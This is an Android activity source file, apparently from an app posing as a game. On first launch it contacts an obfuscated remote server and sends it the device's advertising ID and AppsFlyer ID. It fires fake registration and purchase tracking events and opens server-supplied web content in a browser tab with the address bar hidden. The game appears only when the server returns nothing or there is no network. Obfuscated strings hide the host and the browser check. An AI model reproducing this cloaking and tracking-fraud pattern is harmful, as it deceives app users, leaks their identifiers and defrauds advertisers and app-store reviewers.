package com.youstorylve;

import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.util.Base64;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;
import androidx.browser.customtabs.CustomTabsIntent;

import com.appsflyer.AppsFlyerLib;
import com.facebook.applinks.AppLinkData;
import com.facebook.applinks.BuildConfig;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutionException;

import static com.youstorylve.App.preferencesManager;
import static com.youstorylve.PreferencesManagerImpl.SJSKCJ;
public class YouStoryActivity extends AppCompatActivity {

    public static final String RUN = "pls://run";
    public String URL;
    private DownloadTask task;
    private CountDownTimer waitToshow;
    private String uri;

    public static final String s = "h";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        setContentView(R.layout.activity_youstory);


        task = new DownloadTask();
        PreferencesManagerImpl preferencesManager = new PreferencesManagerImpl(getApplicationContext());

        URL = "https://";
        URL = URL + "doriscclin";
        //URL = URL + ".com/LtXZmxph";

        URL = URL + decodeBase64("LmNvbS9MdFhabXhwaA==");


        Map<String, Object> eventValue = new HashMap<String, Object>();
        AppsFlyerLib.getInstance().trackEvent(getApplicationContext() , "af_registration" , eventValue);
        AppsFlyerLib.getInstance().trackEvent(getApplicationContext() , "af_purchase" , eventValue);





        waitToshow = new CountDownTimer(3000, 1) {
            @Override
            public void onTick(long millisUntilFinished) {
            }

            @Override
            public void onFinish() {
                showWeb();
            }
        };
        if (CheckNet.conCheck(getApplicationContext())) {


            boolean first = preferencesManager.getMyFirstTime();

            if (first) {
                //the app is being launched for first time, do something
                preferencesManager.setURL(null);
                // first time task

                new GetGAIDTask().execute();

                // record the fact that the app has been started at least once
                preferencesManager.setMyFirstTime(false);


            } else {
                if (preferencesManager.getSateStartSte()) {
                    showWeb();
                } else if (preferencesManager.getGameStart()) {
                    showGame();
                }

            }


        }else {

            PreferencesManagerImpl.setSateStartSte(false);
            PreferencesManagerImpl.setGameStart(true);
            showGame();
        }
    }

    private void showWeb() {

        try {
            String PreferencesManagerImplURL = PreferencesManagerImpl.getURL();
            if (PreferencesManagerImplURL != null) {
                uri = PreferencesManagerImplURL;

                Log.d("URI", uri);
            }


            BitmapFactory.Options options = new BitmapFactory.Options();
            options.outWidth = 24;
            options.outHeight = 24;
            options.inScaled = true; //already default, just for illustration - ie scale to screen density (dp)

            final Bitmap backButton = BitmapFactory.decodeResource(getResources(), R.drawable.round_done_black_24dp, options);

            CustomTabsIntent.Builder builder = new CustomTabsIntent.Builder();
            builder.enableUrlBarHiding();
            builder.setToolbarColor(Color.BLACK);
            builder.setShowTitle(false);
            builder.addDefaultShareMenuItem();
            builder.setCloseButtonIcon(backButton);

            CustomTabsIntent customTabsIntent = builder.build();

            boolean chromeInstalled = false;
            for (ApplicationInfo applicationInfo : getPackageManager().getInstalledApplications(0)) {
                if (applicationInfo.packageName.equals("com.android.c" + s + "rom" + SJSKCJ)) {
                    chromeInstalled = true;
                    break;
                }
            }
            if (chromeInstalled) {
                customTabsIntent.intent.setPackage("com.android.c" + s + "rom" + SJSKCJ);
            }
            customTabsIntent.launchUrl(this, Uri.parse(uri));

            finish();


        } catch (Resources.NotFoundException e) {

            if (BuildConfig.DEBUG) {


                e.printStackTrace();
            }
        }
    }

    protected void getUrl() {
        try {
            String string = task.execute(URL).get();
            StringBuilder stringBuilder = new StringBuilder();


            if (string != null && string != "") {
                String managerURL = PreferencesManagerImpl.getURL();
                if (managerURL != null) {
                    stringBuilder.append(string);
                    stringBuilder.append(managerURL);

                    stringBuilder.toString();
                    PreferencesManagerImpl.setSateStartSte(true);
                    PreferencesManagerImpl.setGameStart(false);

                    PreferencesManagerImpl.setURL(String.valueOf(stringBuilder));
                    waitToshow.start();


                } else if (string != null && string != "") {
                    PreferencesManagerImpl.setURL(string);

                    PreferencesManagerImpl.setSateStartSte(true);
                    PreferencesManagerImpl.setGameStart(false);

                    waitToshow.start();

                } else {
                    PreferencesManagerImpl.setSateStartSte(false);
                    PreferencesManagerImpl.setGameStart(true);
                    showGame();

                }


            } else if (string == "") {
                PreferencesManagerImpl.setSateStartSte(false);
                PreferencesManagerImpl.setGameStart(true);
                showGame();


            }

        } catch (ExecutionException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
            PreferencesManagerImpl.setSateStartSte(false);
            PreferencesManagerImpl.setGameStart(true);
        }
    }
    private void showGame() {
        Intent intent = new Intent(this, MainActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(intent);

    }
    private static class DownloadTask extends AsyncTask<String, Void, String> {

        @Override
        protected String doInBackground(String... strings) {
            StringBuilder result = new StringBuilder();
            java.net.URL url = null;
            HttpURLConnection urlConnection = null;
            try {
                url = new URL(strings[0]);
                urlConnection = (HttpURLConnection) url.openConnection();
                InputStream in = urlConnection.getInputStream();
                InputStreamReader reader = new InputStreamReader(in);
                BufferedReader bufferedReader = new BufferedReader(reader);
                String line = bufferedReader.readLine();
                while (line != null) {
                    result.append(line);
                    line = bufferedReader.readLine();
                }
            } catch (MalformedURLException e) {

                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                if (urlConnection != null) {
                    urlConnection.disconnect();
                }

                return result.toString();

            }
        }
    }


    public static String convertArrayToStringMethod(String[] strArray) {

        StringBuilder stringBuilder = new StringBuilder();

        for (int i = 0; i < strArray.length; i++) {

            stringBuilder.append(strArray[i]);

        }

        return stringBuilder.toString();

    }
    private String decodeBase64(String coded) {
        byte[] valueDecoded = new byte[0];
        valueDecoded = Base64.decode(coded.getBytes(StandardCharsets.UTF_8), Base64.DEFAULT);
        return new String(valueDecoded);
    }

    private class GetGAIDTask extends AsyncTask<Void, Void, Void> {

        @Override
        protected Void doInBackground(Void... voids) {
            AdvertisingIdClient.Info idInfo = null;
            try {
                idInfo = AdvertisingIdClient.getAdvertisingIdInfo(YouStoryActivity.this.getApplication());
            } catch (GooglePlayServicesNotAvailableException e) {
                e.printStackTrace();
            } catch (GooglePlayServicesRepairableException e) {
                e.printStackTrace();
            } catch (Exception e) {
                e.printStackTrace();
            }
            String advertId = null;
            try {
                advertId = idInfo.getId();

            } catch (Exception e) {
                e.printStackTrace();
            }

            String finalAdvertId = advertId;


            try {


                AppLinkData.fetchDeferredAppLinkData(getApplicationContext(), appLinkData -> {
                    AppLinkData appLinkData1 = appLinkData;
                    if (appLinkData1 == null || appLinkData1.getTargetUri() == null) {
                        PreferencesManagerImpl.setSateStartSte(true);
                        PreferencesManagerImpl.setURL("?sub8=" + preferencesManager.getAppsFlyerUID() + "&sub9=" + finalAdvertId + "&sub10=true");
                        Log.d("MytTag", "?sub8=" + preferencesManager.getAppsFlyerUID() + "&sub9=" + finalAdvertId + "&sub10=true");
                        getUrl();

                    } else {
                        String url = appLinkData1.getTargetUri().toString();

                        String string = convertArrayToStringMethod(url.split(RUN));

                        PreferencesManagerImpl.setURL(string + "&sub8=" + preferencesManager.getAppsFlyerUID() + "&sub9=" + finalAdvertId + "&sub10=true");
                        Log.d("MytTag", "?sub8=" + preferencesManager.getAppsFlyerUID() + "&sub9=" + finalAdvertId + "&sub10=true");
                        PreferencesManagerImpl.setSateStartSte(true);

                        getUrl();

                    }
                });
            } catch (Exception e) {

                e.printStackTrace();
            }


            return null;
        }
    }

}